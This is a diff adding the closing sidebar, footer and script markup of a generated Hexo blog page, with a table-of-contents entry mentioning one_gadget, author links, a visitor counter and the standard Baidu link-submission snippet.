+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-27用one-gadget做了一下"><span class="nav-number">1.</span> <span class="nav-text">6.27用one_gadget做了一下</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="ling"
+      src="/images/%E7%A9%B9.jpg">
+  <p class="site-author-name" itemprop="name">ling</p>
+  <div class="site-description" itemprop="description">永远不要停止思考啊</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">5</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ll1ng" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ll1ng" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://ll1ng.github.io/atom.xml" title="rss → https:&#x2F;&#x2F;ll1ng.github.io&#x2F;atom.xml"><i class="fa fa-rss fa-fw"></i>rss</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      小伙伴们>.<
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="https://www.wootec.top/" title="https:&#x2F;&#x2F;www.wootec.top&#x2F;" rel="noopener" target="_blank">Reverier</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://arttnba3.cn/" title="https:&#x2F;&#x2F;arttnba3.cn&#x2F;" rel="noopener" target="_blank">arttnba3</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://mercer5.github.io/" title="https:&#x2F;&#x2F;mercer5.github.io&#x2F;" rel="noopener" target="_blank">mercer</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://yoursite.com/" title="http:&#x2F;&#x2F;yoursite.com" rel="noopener" target="_blank">...</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+    <!--music-->
+    <div>
+    
+    <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=446935665&auto=0&height=66"></iframe>
+      
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2020 – 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ling</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+  <script>
+    (function(){
+      var canonicalURL, curProtocol;
+      //Get the <link> tag
+      var x=document.getElementsByTagName("link");
+		//Find the last canonical URL
+		if(x.length > 0){
+			for (i=0;i<x.length;i++){
+				if(x[i].rel.toLowerCase() == 'canonical' && x[i].href){
+					canonicalURL=x[i].href;
+				}
+			}
+		}
+    //Get protocol
+	    if (!canonicalURL){
+	    	curProtocol = window.location.protocol.split(':')[0];
+	    }
+	    else{
+	    	curProtocol = canonicalURL.split(':')[0];
+	    }
+      //Get current URL if the canonical URL does not exist
+	    if (!canonicalURL) canonicalURL = window.location.href;
+	    //Assign script content. Replace current URL with the canonical URL
+      !function(){var e=/([http|https]:\/\/[a-zA-Z0-9\_\.]+\.baidu\.com)/gi,r=canonicalURL,t=document.referrer;if(!e.test(r)){var n=(String(curProtocol).toLowerCase() === 'https')?"https://sp0.baidu.com/9_Q4simg2RQJ8t7jm9iCKT-xh_/s.gif":"//api.share.baidu.com/s.gif";t?(n+="?r="+encodeURIComponent(document.referrer),r&&(n+="&l="+r)):r&&(n+="?l="+r);var i=new Image;i.src=n}}(window);})();
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
